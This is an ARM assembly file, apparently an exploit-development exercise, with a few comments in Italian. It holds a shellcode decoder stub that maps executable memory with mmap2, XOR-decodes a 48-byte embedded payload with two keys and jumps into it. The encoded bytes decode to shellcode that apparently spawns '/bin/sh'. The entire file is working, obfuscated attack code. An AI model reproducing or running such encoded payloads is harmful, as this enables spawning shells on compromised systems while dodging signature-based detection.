.global _start
 
_start:
 
  @ mapping new area of memory in the heap
 
  mov r4, #0xffffffff @ file descriptor
 
  ldr r0, =0x00030000 @ address
 
  ldr r1, =0x1000     @ size totale della mapping table
 
  mov r2, #7          @ prot
 
  mov r3, #0x32       @ flags
 
  mov r5, #0          @ offset
 
  mov r7, #192        @ syscall number
 
  swi #0              @ mmap2(0x30000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x30000
 
  mov r8, #48         @ size of the shellcode
 
  mov r1, pc          @ move into r1 the pc
 
  add r1, #76         @ address of the shellcode
 
  ldr r5, =#0x12      @ xor key1
 
  ldr r6, =#0x47      @ xor key2
 
  mov r9, r0          @ save return address of the mnmap
 
  mov r4, #0          @ index for the loop
 
start:
 
  ldrb r2, [r1, r4]   @ store into r2 the byte at the location (r1 + r4)
 
  cmp r4, #6          @ check the number of the index (r4)
 
  bne xor2            @ if r4 is not equal to 6 jmp to xor2
 
xor1:
 
  eor r2, r2, r5      @ decoder alghorithm with xor key1
 
  strb r2, [r9, r4]   @ save the decoded byte into the allocated memory
 
  add r4, #1          @ increment the index by 1
 
  b start             @ jump to start
 
xor2:
 
  cmp r4, #12         @ check the number of the index (r4)
 
  beq xor1            @ if r4 is equal to 12 jmp to xor1
 
  eor r2, r2, r6      @ decoder alghorithm with xor key2
 
  strb r2, [r9, r4]   @ save the decoded byte into the allocated memory
 
  add r4, #1          @ increment the index by 1
 
  cmp r4, r8          @ check the index with the size of the shellcode
 
  bne start           @ if index!=sizeOfShellcode jump to start
 
end:
 
  blx r9              @ jmp to the allocated area
 
shellcode: .byte 0x48,0x47,0xe7,0xa6,0x67,0x47,0x92,0xa5,0x45,0x67,0x5,0xa7,0x17,0x47,0x6a,0xae,0x4a,0x57,0xe7,0xa6,0x4c,0x37,0xe7,0xa4,0x47,0x47,0x47,0xa8,0x47,0x47,0xe7,0xa4,0x46,0x37,0xe7,0xa4,0x47,0x47,0x47,0xa8,0x68,0x25,0x2e,0x29,0x68,0x34,0x2f,0x47

